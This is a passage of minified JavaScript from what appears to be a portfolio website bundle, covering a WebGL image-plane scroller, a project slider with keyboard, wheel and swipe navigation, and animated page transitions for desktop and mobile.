				key: "computeScrollWidth",
				value: function() {
					var t = this.planes[0].bound.x,
						e = this.planes[this.planes.length - 1],
						i = e.bound.x + e.bound.width - t - 1 + oo.BOUNDS_OFFSET_START_MOBILE;
					return i <= 0 ? 0 : i * fs.WINDOW_WIDTH + this.scroll.paddingEnd
				}
			}, {
				key: "computeScrollHeight",
				value: function() {
					var t = 0,
						e = oo.GL_IMAGE_WIDTH();
					this.planes.forEach((function(i) {
						var n = e / i.bound.ratio * fs.WINDOW_RATIO;
						t += n
					})), t += (this.planes.length - 1) * oo.GL_IMAGE_GAP();
					var i = oo.GL_IMAGE_START_Y(),
						n = t - 1 + i;
					return n < 0 ? 0 : n * fs.WINDOW_HEIGHT + this.scroll.paddingEnd
				}
			}, {
				key: "computeScrollSize",
				value: function() {
					this.setScrollSize("y" === this.direction ? this.computeScrollHeight() : this.computeScrollWidth())
				}
			}, {
				key: "disable",
				value: function() {
					this.enabled && (cs.ticker.remove(this._onTick), this.vs.off(this.onScroll), this.resetScroll(), this.enabled = !1)
				}
			}, {
				key: "enable",
				value: function() {
					var t = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
					this.enabled || (this.computeScrollSize(), t && this._handleVisibility(), this.vs.on(this.onScroll), cs.ticker.add(this._onTick), this.enabled = !0)
				}
			}, {
				key: "destroy",
				value: function() {
					cs.ticker.remove(this._onTick), this.vs.off(this.onScroll)
				}
			}]), t
		}(),
		uo = function() {
			function t() {
				r()(this, t)
			}
			return o()(t, null, [{
				key: "moveOutScreen",
				value: function(t, e) {
					return t && 0 !== t.length ? (t[t.length - 1].bound, cs.to(t.map((function(t) {
						return t.bound
					})), {
						x: "+=" + (oo.GL_IMAGE_WIDTH() + 32 / fs.WINDOW_WIDTH * 2),
						stagger: .05,
						ease: "smooth_1",
						duration: .7,
						onUpdate: function() {
							t.forEach((function(t) {
								return t._resize()
							}))
						}
					})) : (console.warn("inViewPlanes is empty"), Promise.resolve())
				}
			}]), t
		}(),
		ho = i(16),
		lo = i.n(ho),
		co = i(17),
		po = i.n(co),
		fo = function() {
			function t(e) {
				var i = e.wrapper;
				r()(this, t), this.wrapper = i, this.dom = {}, this.slider = {
					index: 0,
					currentSection: null,
					currentSlide: null,
					paginationWidth: 0,
					animating: !1,
					barPositions: [],
					count: 0
				}, this.wheeling = !1, this.wheelingThreshold = 75, this.onClickSlide = this.onClickSlide.bind(this), this.onWheel = this.onWheel.bind(this), this.onKeyDown = this.onKeyDown.bind(this), this.onSwipe = this.onSwipe.bind(this), this.onClickButton = this.onClickButton.bind(this), this.init()
			}
			return o()(t, [{
				key: "onKeyDown",
				value: function(t) {
					var e = "ArrowLeft" === t.key ? -1 : "ArrowRight" === t.key ? 1 : 0;
					if (0 !== e) {
						var i = this.slider.index + e;
						i < this.dom.sections.length && i >= 0 && (this.dom.slides[i].focus(), this.navigate(this.slider.index, i))
					}
				}
			}, {
				key: "onWheel",
				value: function(t) {
					if (!this.slider.animating) {
						var e = lo()(t);
						Math.abs(e.pixelY) > this.wheelingThreshold && this.handleSliderNavigation(1 * Math.sign(e.pixelY))
					}
				}
			}, {
				key: "onClickSlide",
				value: function(t) {
					var e = t.currentTarget,
						i = parseInt(e.dataset.index),
						n = this.slider.index;
					i !== this.slider.index && this.navigate(n, i)
				}
			}, {
				key: "onSwipe",
				value: function(t) {
					var e = t.detail.directions,
						i = e.right || e.bottom ? -1 : e.left || e.top ? 1 : 0;
					this.handleSliderNavigation(i)
				}
			}, {
				key: "onClickButton",
				value: function(t) {
					var e = "next" === t.currentTarget.dataset.direction ? 1 : -1;
					this.handleSliderNavigation(e)
				}
			}, {
				key: "handleSliderNavigation",
				value: function(t) {
					var e = this.slider.index + t;
					e < this.dom.sections.length && e >= 0 && this.navigate(this.slider.index, e)
				}
			}, {
				key: "addEvents",
				value: function() {
					var t = this;
					this.dom.slides.forEach((function(e) {
						return e.addEventListener("click", t.onClickSlide)
					})), fs.IS_MOBILE ? (this.swipeListener = po()(this.wrapper), this.wrapper.addEventListener("swipe", this.onSwipe), this.dom.navBtns.forEach((function(e) {
						return e.addEventListener("click", t.onClickButton)
					}))) : (this.wrapper.addEventListener("mousewheel", this.onWheel, {
						passive: !0
					}), this.wrapper.addEventListener("wheel", this.onWheel, {
						passive: !0
					}), document.addEventListener("keydown", this.onKeyDown))
				}
			}, {
				key: "removeEvents",
				value: function() {
					var t = this;
					this.dom.slides.forEach((function(e) {
						return e.removeEventListener("click", t.onClickSlide)
					})), fs.IS_MOBILE ? this.swipeListener && this.swipeListener.off() : (this.wrapper.removeEventListener("mousewheel", this.onWheel, {
						passive: !0
					}), this.wrapper.removeEventListener("wheel", this.onWheel, {
						passive: !0
					}), document.removeEventListener("keydown", this.onKeyDown))
				}
			}, {
				key: "updateNavigationButtons",
				value: function(t) {
					0 === t ? this.dom.navBtns[0].classList.add("hide") : this.dom.navBtns[0].classList.remove("hide"), t === this.slider.count - 1 ? this.dom.navBtns[1].classList.add("hide") : this.dom.navBtns[1].classList.remove("hide")
				}
			}, {
				key: "navigate",
				value: function(t, e) {
					var i = this,
						n = this.slider.currentSection,
						r = this.dom.sections[e];
					if (n && r) {
						this.slider.animating = !0, n.classList.remove("active"), r.classList.add("active"), this.slider.currentSection = r, this.slider.index = e, this.updateNavigationButtons(this.slider.index);
						var s = fs.IS_MOBILE ? this.slider.barPositions[Math.min(2, this.slider.index)] : this.slider.barPositions[this.slider.index];
						return this.dom.bar.style.transform = "translateX(".concat(s, "px)"), this.slider.currentSlide.classList.remove("active"), this.dom.slides[this.slider.index].classList.add("active"), this.slider.currentSlide = this.dom.slides[this.slider.index], ps.emit(vs, this.slider.currentSection.dataset.uid), fs.currentProject = this.dom.sections[this.slider.index].dataset.uid, this.animate(t, e).then((function() {
							i.slider.animating = !1
						}))
					}
					return Promise.resolve()
				}
			}, {
				key: "animate",
				value: function(t, e) {
					var i = this,
						n = cs.timeline({
							onComplete: function() {
								i.dom.sections[t].classList.contains("active") || (i.dom.sections[t].style.display = "none")
							}
						});
					if (n.to(this.dom.titles[t], {
							y: "-100%",
							ease: "smooth_1",
							stagger: .1,
							duration: .7,
							overwrite: !0
						}), fs.IS_MOBILE)
						if (e > 2) {
							var r = e - t;
							cs.to(this.dom.scrollContainer, {
								x: "+=" + -r * (fs.SLIDER_MOBILE_THUMB_WIDTH + fs.SLIDER_MOBILE_THUMB_GAP),
								ease: "smooth_1",
								duration: .7
							})
						} else t > 2 && e <= 2 && cs.to(this.dom.scrollContainer, {
							x: 0,
							ease: "smooth_1",
							duration: .7
						});
					return n.fromTo(this.dom.titles[e], {
						y: "100%"
					}, {
						y: "0%",
						ease: "smooth_1",
						duration: .7,
						stagger: .1,
						onStart: function() {
							i.dom.sections[e].style.display = ""
						}
					}, .3), n.to(this.dom.otherLines[t], {
						y: "-100%",
						ease: "smooth_1",
						duration: .7,
						delay: .1
					}, 0), n.fromTo(this.dom.otherLines[e], {
						y: "100%"
					}, {
						y: "0%",
						ease: "smooth_1",
						duration: .7,
						delay: .1
					}, .3), n
				}
			}, {
				key: "init",
				value: function() {
					this.dom.pagination = this.wrapper.querySelector(".page-index__slider"), this.dom.scrollContainer = this.wrapper.querySelector(".page-index__slider-scroll-container"), this.dom.slides = Array.from(this.dom.pagination.querySelectorAll(".page-index__slider-slide")), this.dom.sections = Array.from(this.wrapper.querySelectorAll(".page-index__section")), this.dom.bar = this.wrapper.querySelector(".page-index__slider-bar"), this.dom.titles = Array.from(this.wrapper.querySelectorAll(".page-index__section-title")).map((function(t) {
						return t.querySelectorAll(".b-line-item")
					})), this.dom.otherLines = this.dom.sections.map((function(t) {
						return t.querySelectorAll(".page-index__section-info-item .b-line-item, .page-index__section-link .b-line-item")
					})), this.dom.navBtns = this.wrapper.querySelectorAll(".page-index__slider-nav-btn"), this.slider.index = fs.currentProject ? this.dom.sections.findIndex((function(t) {
						return t.dataset.uid === fs.currentProject
					})) : 0, this.slider.count = this.dom.sections.length, this.slider.currentSection = this.dom.sections[this.slider.index], this.slider.currentSlide = this.dom.slides[this.slider.index], this.slider.paginationWidth = this.dom.pagination.clientWidth, this.slider.barPositions = Zs(this.dom.slides), this.dom.sections.forEach((function(t) {
						t.dataset.uid !== fs.currentProject && (t.style.display = "none")
					})), this.dom.slides[this.slider.index].classList.add("active"), this.dom.bar.style.transition = "", this.dom.bar.style.opacity = "";
					var t = fs.IS_MOBILE ? this.slider.barPositions[Math.min(2, this.slider.index)] : this.slider.barPositions[this.slider.index];
					this.dom.bar.style.transform = "translateX(".concat(t, "px)"), this.updateNavigationButtons(this.slider.index), this.addEvents()
				}
			}, {
				key: "destroy",
				value: function() {
					this.removeEvents()
				}
			}]), t
		}();
	var mo = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "onLeaveCompleted",
			value: function() {
				this.slider.destroy()
			}
		}, {
			key: "onEnter",
			value: function() {
				this._wrapper = this.wrap.lastElementChild;
				var t = this._wrapper.querySelector(".js__index-section").dataset.uid;
				fs.currentProject || (fs.currentProject = t)
			}
		}, {
			key: "onEnterCompleted",
			value: function() {
				var t = this;
				this.slider = new fo({
					wrapper: this._wrapper
				}), fs.isFirstPage && ta((function() {
					t.Transition.in({
						from: {
							remove: qs
						},
						to: t._wrapper,
						done: qs
					}), ps.emit(xs, !0)
				}))
			}
		}, {
			key: "onLeave",
			value: function() {
				this.slider.destroy()
			}
		}], [{
			key: "_getBounds",
			value: function(t) {
				return fs.IS_MOBILE ? i._getMobileBounds(t) : i._getDesktopBounds(t)
			}
		}, {
			key: "_getMobileBounds",
			value: function(t) {
				for (var e = [], n = i.BOUNDS_WIDTH_MOBILE, r = i.BOUNDS_GAP_X_MOBILE, s = (1 - n) / 2, o = 0; o < t.length; o++) e.push({
					width: n,
					ratio: 16 / 9,
					x: o * (n + r) + s,
					y: .23
				});
				return e
			}
		}, {
			key: "_getDesktopBounds",
			value: function(t) {
				for (var e = [], i = Vs(350), n = i / (16 / 9) * fs.WINDOW_RATIO, r = 0; r < t.length; r++) {
					var s = {
						width: i,
						ratio: 16 / 9,
						x: 0,
						y: 0
					};
					switch (r) {
						case 0:
							s.x = Vs(120), s.y = .5 + Gs(25);
							break;
						case 1:
							s.x = Vs(195), s.y = .5 - Gs(75) + Gs(25);
							break;
						case 2:
							s.x = 1 - i - Vs(120), s.y = .5 - n - Gs(25);
							break;
						case 3:
							s.x = 1 - i - Vs(195), s.y = .5 - n + Gs(75) - Gs(25)
					}
					e.push(s)
				}
				return e
			}
		}, {
			key: "_getIndexMediaMobile",
			value: function() {
				var t = [];
				for (var e in fs.media) t.push(fs.media[e][0]);
				return t
			}
		}, {
			key: "_getMedia",
			value: function(t, e) {
				return fs.IS_MOBILE ? i._getIndexMediaMobile() : fs.media[t || "365-a-year-of-cartier"].slice(0, 4)
			}
		}, {
			key: "_getMediaUID",
			value: function() {
				return document.querySelector(".js__index-section:first-child").dataset.uid
			}
		}]), i
	}(js.Renderer);
	mo.BOUNDS_WIDTH_MOBILE = Hs(270), mo.BOUNDS_GAP_X_MOBILE = Hs(16), mo.BOUNDS_OFFSET_START_MOBILE = (1 - mo.BOUNDS_WIDTH_MOBILE) / 2;
	var go = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			var t;
			return r()(this, i), (t = e.call(this)).allPlanes = {}, t.allMedia = {}, t.planes = [], t.media = [], t.scroller = new ao({
				planes: t.planes,
				direction: fs.IS_MOBILE ? "x" : "y"
			}), t.scroller.onTick = t._onScroll.bind(u()(t)), t._getProperBounds = null, t._onSliderNavigateIn = t._onSliderNavigateIn.bind(u()(t)), t._onNavigateToIndex = t._onNavigateToIndex.bind(u()(t)), t._onNavigateToProject = t._onNavigateToProject.bind(u()(t)), t._onLeaveProject = t._onLeaveProject.bind(u()(t)), t._onLeaveIndex = t._onLeaveIndex.bind(u()(t)), t._onAppearProject = t._onAppearProject.bind(u()(t)), window.getPlayingVideos = function() {
				var e = Object.values(t.allPlanes).flat().filter((function(t) {
					return "VIDEO" === t._media.tagName && !t._media.paused
				}));
				console.log("playing", e.length)
			}, t
		}
		return o()(i, [{
			key: "_hydrateAllMedia",
			value: function(t, e) {
				this.allMedia[t] ? this.allMedia[t] && this.allMedia[t].length < e.length ? ($s(this.allMedia[t]), Xs(this.allMedia[t], e)) : console.warn("already up to date") : this.allMedia[t] = e
			}
		}, {
			key: "_createPlaneImage",
			value: function(t) {
				var e = new Ss({
					media: t
				});
				return e._build(), this.addChild(e), e.visible = !1, e._initTexture(), e
			}
		}, {
			key: "_hydratePlanesFor",
			value: function(t, e) {
				var i = this;
				if (this.allPlanes[e]) {
					if (this.allPlanes[e].length === t.length || this.allPlanes[e].length > t.length) console.warn("already up to date");
					else if (this.allPlanes[e].length < t.length)
						for (var n = this.allPlanes[e].length; n < t.length; n++) this.allPlanes[e].push(this._createPlaneImage(t[n]))
				} else this.allPlanes[e] = t.map((function(t) {
					return i._createPlaneImage(t)
				}));
				this.allMedia[e] = t
			}
		}, {
			key: "_hydrateAllPlanes",
			value: function() {
				for (var t = Object.keys(fs.media), e = 0; e < t.length; e++) {
					var i = t[e],
						n = fs.media[i];
					this._hydratePlanesFor(n, i)
				}
			}
		}, {
			key: "_build",
			value: function() {
				var t = fs.appeared;
				if (this._hydrateAllPlanes(), "about" !== t && "archive" !== t) {
					var e = ea.Router.Helpers.renderers[t],
						i = e._getMediaUID(),
						n = e._getMedia(i);
					Xs(this.media, n);
					var r = e._getBounds(n);
					this._getProperBounds = e._getBounds, this._toggleVisibilityPlanes("index" === t ? this.allPlanes[i].slice(0, 4) : this.allPlanes[i], !0), Xs(this.planes, "index" === t ? this.allPlanes[i].slice(0, 4) : this.allPlanes[i]), this.planes.forEach((function(t, e) {
						t._updateBound(r[e])
					})), "project" === t && this.scroller.enable()
				}
				this._addEvents()
			}
		}, {
			key: "_addEvents",
			value: function() {
				ps.on(vs, this._onSliderNavigateIn), ps.on(xs, this._onNavigateToIndex), ps.on(_s, this._onAppearProject), ps.on(Ds, this._onNavigateToProject), ps.on(ys, this._onLeaveProject), ps.on(ws, this._onLeaveIndex)
			}
		}, {
			key: "_onScroll",
			value: function(t) {
				for (var e = this.planes.length, i = 0; i < e; i++) this.planes[i].scrollY = t, this.planes[i]._updatePosition()
			}
		}, {
			key: "_onLeaveIndex",
			value: function(t) {
				var e = this;
				this.planes.forEach((function(t) {
					"VIDEO" === t._type && t._pauseVideo()
				})), t.to(this.planes.map((function(t) {
					return t.bound
				})), {
					x: function(t, e) {
						return -e.width - .1
					},
					ease: "smooth_1",
					duration: .7,
					onUpdate: function() {
						e.planes.forEach((function(t) {
							return t._resize()
						}))
					},
					onComplete: function() {
						e._togglePlaneImageProperties(e.planes, ["visible"], [!1]), $s(e.planes)
					}
				}, 0)
			}
		}, {
			key: "_onLeaveProject",
			value: function(t, e) {
				var i = [];
				return i = "project" === t ? this.planes.filter((function(t) {
					return t.inview
				})) : this.planes.slice(4).filter((function(t) {
					return t.inview
				})), this.scroller.disable(), uo.moveOutScreen(i, this.scroller.scroll.currentY).then((function() {
					i.forEach((function(t) {
						t.visible = !1, t.scrollY = 0, t._resize()
					})), e && e()
				}))
			}
		}, {
			key: "_onSliderNavigateIn",
			value: function(t) {
				var e = this,
					i = this.allMedia[t],
					n = this.allPlanes[t].slice(0, 4);
				n.length === this.planes.length ? cs.to(this.planes.map((function(t) {
					return t._program.uniforms.uProgress
				})), {
					value: 0,
					ease: "smooth_1",
					duration: .175,
					onStart: function() {
						n.forEach((function(t) {
							"VIDEO" === t._type && t._playVideo()
						}))
					},
					onComplete: function() {
						$s(e.media), Xs(e.media, i);
						for (var t = 0; t < n.length; t++) n[t]._updateBound(e.planes[t].bound), n[t]._resize();
						e._toggleVisibilityPlanes(e.planes, !1), e._restorePlanesProgress(e.planes, 1), e.planes.forEach((function(t) {
							"VIDEO" === t._type && t._pauseVideo()
						})), $s(e.planes), Xs(e.planes, n), e._restorePlanesInview(e.planes, !0);
						for (var r = [], s = 0; s < e.planes.length; s++) e.planes[s]._lazy && !e.planes[s]._loaded ? e.planes[s]._lazyLoad(!1) : r.push(e.planes[s]);
						cs.fromTo(r.map((function(t) {
							return t._program.uniforms.uProgress
						})), {
							value: 0
						}, {
							value: 1,
							ease: "smooth_1",
							duration: .7
						}), e._toggleVisibilityPlanes(e.planes, !0)
					}
				}) : console.error("missmatching new planes and old planes length", n, this.planes)
			}
		}, {
			key: "_onNavigateSwitchProject",
			value: function(t, e) {
				for (var i = this, n = this.allPlanes[e], r = 0; r < n.length; r++) n[r]._updateBound(t[r]), n[r]._resize();
				this._toggleVisibilityPlanes(this.planes, !1), this._restorePlanesScroll(this.planes), this.planes.forEach((function(t) {
					"VIDEO" === t._type && t._pauseVideo()
				})), $s(this.planes), Xs(this.planes, n), console.log("ppl ay", this.planes[0]._media.src), "VIDEO" === this.planes[0]._type && this.planes[0]._playVideo(), this._toggleVisibilityPlanes(this.planes, !0), cs.from(this.planes.map((function(t) {
					return t.bound
				})), {
					y: "+=" + (1 - oo.GL_IMAGE_START_Y() + .1),
					ease: "smooth_1",
					duration: .7,
					onUpdate: function() {
						i.planes.forEach((function(t) {
							return t._resize()
						}))
					},
					onComplete: function() {
						i.scroller._handleVisibility()
					}
				}), this.scroller.enable(!0)
			}
		}, {
			key: "_onAppearProject",
			value: function() {
				var t = this.planes.filter((function(t) {
					return t.inview
				}));
				this.planes[0]._playVideo(), t.forEach((function(t) {
					return t.visible = !1
				})), cs.from(t.map((function(t) {
					return t.bound
				})), {
					x: "+=" + (1 - oo.GL_IMAGE_X()),
					ease: "smooth_1",
					duration: .7,
					stagger: .025,
					onStart: function() {
						t.forEach((function(t) {
							return t.visible = !0
						}))
					},
					onUpdate: function() {
						t.forEach((function(t) {
							return t._resize()
						}))
					}
				})
			}
		}, {
			key: "_onNavigateToProject",
			value: function(t, e) {
				var i = this,
					n = oo._getMedia(e);
				$s(this.media), Xs(this.media, n), this._hydratePlanesFor(n, e);
				var r = oo._getBounds(n);
				this._getProperBounds = oo._getBounds, "project" === t ? this._onNavigateSwitchProject(r, e) : ($s(this.planes), Xs(this.planes, this.allPlanes[e]), this._animateToNextBounds(r, !1, "end").then((function() {
					i.scroller._handleVisibility()
				})), this.planes.slice(4).forEach((function(t, e) {
					return t._updateBound(r[e + 4])
				})), this._toggleVisibilityPlanes(this.planes, !0), this.scroller.enable(!0))
			}
		}, {
			key: "_onNavigateToIndex",
			value: function(t) {
				var e = void 0 !== t ? t : 0 === this.planes.length,
					i = mo._getMedia(fs.currentProject);
				$s(this.media), Xs(this.media, i);
				var n = mo._getBounds(i);
				if (this._getProperBounds = mo._getBounds, e) {
					for (var r = fs.currentProject || this._getDefaultUID(), s = this.allPlanes[r].slice(0, 4), o = 0; o < s.length; o++) s[o]._updateBound(n[o]), s[o].bound.x = -s[o].bound.width;
					$s(this.planes), Xs(this.planes, s)
				} else ! function(t, e) {
					for (; t.length > 4;) t.pop()
				}(this.planes);
				for (var a = 0; a < this.planes.length; a++) this.planes[a]._lazy && !this.planes[a]._loaded && this.planes[a]._lazyLoad(!1), "VIDEO" === this.planes[a]._type && this.planes[a]._playVideo();
				this._hydrateAllPlanes(), this._restorePlanesInview(this.planes, !0), this._animateToNextBounds(n, !0, "start")
			}
		}, {
			key: "_getDefaultUID",
			value: function() {
				return Object.keys(this.allPlanes)[0]
			}
		}, {
			key: "_togglePlaneImageProperties",
			value: function(t, e, i) {
				for (var n = 0; n < t.length; n++)
					for (var r = 0; r < e.length; r++) t[n][e[r]] = i[r]
			}
		}, {
			key: "_restorePlanesScroll",
			value: function(t) {
				for (var e = 0; e < t.length; e++) t[e].scrollY = 0, t[e].scrollX = 0
			}
		}, {
			key: "_restorePlanesInview",
			value: function(t, e) {
				for (var i = 0; i < t.length; i++) t[i].inview = e, t[i].inviewActive = e
			}
		}, {
			key: "_restorePlanesProgress",
			value: function(t, e) {
				for (var i = 0; i < t.length; i++) t[i]._program.uniforms.uProgress.value = e
			}
		}, {
			key: "_animateToNextBounds",
			value: function(t) {
				var e = this,
					i = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
					n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "start",
					r = cs.timeline({
						defaults: {
							duration: .7,
							ease: "smooth_1",
							stagger: {
								each: .05,
								from: n
							}
						}
					});
				return i && r.to(this.planes, {
					scrollY: 0,
					scrollX: 0
				}), r.to(this.planes.map((function(t) {
					return t.bound
				})), {
					x: function(e) {
						return t[e].x
					},
					y: function(e) {
						return t[e].y
					},
					width: function(e) {
						return t[e].width
					},
					ratio: function(e) {
						return t[e].ratio
					},
					onStart: function() {
						e._toggleVisibilityPlanes(e.planes, !0)
					},
					onUpdate: function() {
						e.planes.forEach((function(t) {
							return t._resize()
						}))
					},
					onComplete: function() {
						e.scroller.computeScrollSize()
					}
				}, 0), r
			}
		}, {
			key: "_toggleVisibilityPlanes",
			value: function(t) {
				for (var e = arguments.length > 1 && void 0 !== arguments[1] && arguments[1], i = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0, n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : t.length, r = i; r < n; r++) t[r].visible = e
			}
		}, {
			key: "_update",
			value: function() {
				for (var t = 0; t < this.planes.length; t++) this.planes[t]._update()
			}
		}, {
			key: "_resize",
			value: function() {
				if (this._getProperBounds) {
					for (var t = this._getProperBounds(this.media), e = 0; e < this.planes.length; e++) this.planes[e]._updateBound(t[e]), this.planes[e]._resize();
					this.scroller.resize()
				}
			}
		}]), i
	}(st);
	var vo = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "_getIndexPlanes",
			value: function() {
				var t = [];
				for (var e in this.allPlanes) t.push(this.allPlanes[e][0]);
				return t
			}
		}, {
			key: "_initUIDIndex",
			value: function() {
				var t = {},
					e = 0;
				for (var i in this.allMedia) t[i] = e, e++;
				this.UIDIndexes = t
			}
		}, {
			key: "_build",
			value: function() {
				var t = fs.appeared;
				if (this._hydrateAllPlanes(), this._initUIDIndex(), "about" !== t && "archive" !== t) {
					var e = ea.Router.Helpers.renderers[t],
						i = e._getMediaUID();
					this.currentUID = i;
					var n = e._getMedia(i);
					Xs(this.media, n);
					var r = e._getBounds(n);
					this._getProperBounds = e._getBounds, Xs(this.planes, "index" === t ? this._getIndexPlanes() : this.allPlanes[i]), this._toggleVisibilityPlanes(this.planes, !0), this._togglePlaneImageProperties(this.planes, ["_stopVideo"], [!0]), this.planes[0]._stopVideo = !1, this.planes.forEach((function(t, e) {
						t._updateBound(r[e])
					})), "project" === t && this.scroller.enable()
				} else this.currentUID = fs.projects[0];
				this._addEvents()
			}
		}, {
			key: "_onLeaveIndex",
			value: function(t) {
				var e = this,
					i = [],
					n = this.UIDIndexes[this.currentUID],
					r = (i = 0 === n ? [this.planes[0], this.planes[1]] : n === this.planes.length - 1 ? [this.planes[n - 1], this.planes[n]] : [this.planes[n - 1], this.planes[n], this.planes[n + 1]])[i.length - 1],
					s = r.bound.x + r.bound.width;
				t.to(i.map((function(t) {
					return t.bound
				})), {
					x: "+=" + -1 * (s + mo.BOUNDS_GAP_X_MOBILE),
					ease: "smooth_1",
					duration: .7,
					onStart: function() {
						e.planes.forEach((function(t) {
							"VIDEO" === t._type && t._pauseVideo()
						}))
					},
					onUpdate: function() {
						i.forEach((function(t) {
							return t._updatePosition()
						}))
					},
					onComplete: function() {
						e.currentUID = fs.projects[0], e._togglePlaneImageProperties(e.planes, ["visible"], [!1]), $s(e.planes)
					}
				})
			}
		}, {
			key: "_onLeaveProject",
			value: function(t, e) {
				var i = [];
				i = "project" === t ? this.planes.filter((function(t) {
					return t.inview
				})) : this.planes.filter((function(t, e) {
					return 0 !== e && t.inview
				})), this.scroller.disable();
				var n = 0;
				if ("project" === t) {
					var r = i[i.length - 1];
					n = -(r.bound.x + r.bound.width) - r.scrollX / fs.WINDOW_WIDTH - oo.BOUNDS_OFFSET_START_MOBILE
				} else {
					var s = i[0];
					n = 1 - s.bound.x - s.scrollX / fs.WINDOW_WIDTH + oo.BOUNDS_OFFSET_START_MOBILE
				}
				cs.to(i.map((function(t) {
					return t.bound
				})), {
					x: "+=" + n,
					ease: "smooth_1",
					duration: .7,
					onUpdate: function() {
						i.forEach((function(t) {
							return t._updatePosition()
						}))
					},
					onComplete: function() {
						i.forEach((function(t) {
							t.visible = !1, t.scrollY = 0, t.scrollX = 0
						})), e()
					}
				})
			}
		}, {
			key: "_onSliderNavigateIn",
			value: function(t) {
				var e = this,
					i = this.UIDIndexes[t],
					n = this.UIDIndexes[this.currentUID],
					r = i * (mo.BOUNDS_WIDTH_MOBILE + mo.BOUNDS_GAP_X_MOBILE),
					s = this._getProperBounds(this.media);
				this.planes[n]._pauseVideo(), this.planes[i]._playVideo(), cs.to(this.planes.map((function(t) {
					return t.bound
				})), {
					x: function(t) {
						return s[t].x + -r
					},
					ease: "smooth_1",
					duration: .7,
					overwrite: "kill",
					onUpdate: function() {
						for (var t = 0; t < e.planes.length; t++) e.planes[t]._updatePosition()
					}
				}), this.currentUID = t
			}
		}, {
			key: "_onNavigateSwitchProject",
			value: function(t, e) {
				for (var i = this, n = this.allPlanes[e], r = 0; r < n.length; r++) n[r]._updateBound(t[r]), n[r]._resize();
				this._toggleVisibilityPlanes(this.planes, !1), this._restorePlanesScroll(this.planes), this.planes.forEach((function(t) {
					"VIDEO" === t._type && t._pauseVideo()
				})), $s(this.planes), Xs(this.planes, n), this.planes[0]._playVideo(), this._toggleVisibilityPlanes(this.planes, !0), cs.from([n[0], n[1]].map((function(t) {
					return t.bound
				})), {
					ease: "smooth_1",
					duration: .7,
					x: "+=" + (1 + oo.BOUNDS_OFFSET_START_MOBILE),
					onUpdate: function() {
						n[0]._resize(), n[1]._resize()
					},
					onComplete: function() {
						i.scroller.enable(!0)
					}
				})
			}
		}, {
			key: "_onAppearProject",
			value: function() {
				var t = [this.planes[0], this.planes[1]];
				t.forEach((function(t) {
					return t.visible = !1
				})), this.planes[0]._playVideo(), cs.from(t.map((function(t) {
					return t.bound
				})), {
					x: "+=" + (1 - oo.BOUNDS_OFFSET_START_MOBILE + .01),
					ease: "smooth_1",
					duration: .7,
					stagger: .05,
					onStart: function() {
						t.forEach((function(t) {
							return t.visible = !0
						}))
					},
					onUpdate: function() {
						t[0]._resize(), t[1]._resize()
					}
				})
			}
		}, {
			key: "_onNavigateToProject",
			value: function(t, e) {
				var i = this,
					n = oo._getMedia(e);
				$s(this.media), Xs(this.media, n), this._hydratePlanesFor(n, e);
				var r = oo._getBounds(n);
				if (this._getProperBounds = oo._getBounds, "project" === t) this._onNavigateSwitchProject(r, e);
				else {
					var s = cs.timeline(),
						o = [];
					this.UIDIndexes[e] > 0 && o.push(this.planes[this.UIDIndexes[e] - 1]), this.UIDIndexes[e] < this.planes.length - 1 && o.push(this.planes[this.UIDIndexes[e] + 1]), o && s.to(o.map((function(t) {
						return t.bound
					})), {
						x: function(t, e) {
							return "+=" + (e.x > .5 ? 1 : -1) * mo.BOUNDS_OFFSET_START_MOBILE
						},
						ease: "smooth_1",
						duration: .7,
						onUpdate: function() {
							o.forEach((function(t) {
								return t._resize()
							}))
						}
					});
					var a = this.planes[this.UIDIndexes[e]];
					s.to(a.bound, {
						x: r[0].x,
						y: r[0].y,
						width: r[0].width,
						ratio: r[0].ratio,
						ease: "smooth_1",
						duration: .7,
						onUpdate: function() {
							a._resize()
						},
						onComplete: function() {}
					}, 0), $s(this.planes), Xs(this.planes, this.allPlanes[e]);
					var u = this.planes.slice(1);
					u.forEach((function(t, e) {
						t._updateBound(r[e + 1]), t._resize()
					})), s.from(u[0].bound, {
						x: "+=" + (1 - (oo.BOUNDS_OFFSET_START_MOBILE + oo.BOUNDS_WIDTH_MOBILE + oo.BOUNDS_GAP_X_MOBILE)),
						ease: "smooth_1",
						duration: .7,
						onStart: function() {
							i._toggleVisibilityPlanes(i.planes, !0)
						},
						onUpdate: function() {
							u[0]._updatePosition()
						},
						onComplete: function() {
							i.scroller.enable(!0)
						}
					})
				}
				this.currentUID = e
			}
		}, {
			key: "_onNavigateToIndex",
			value: function(t) {
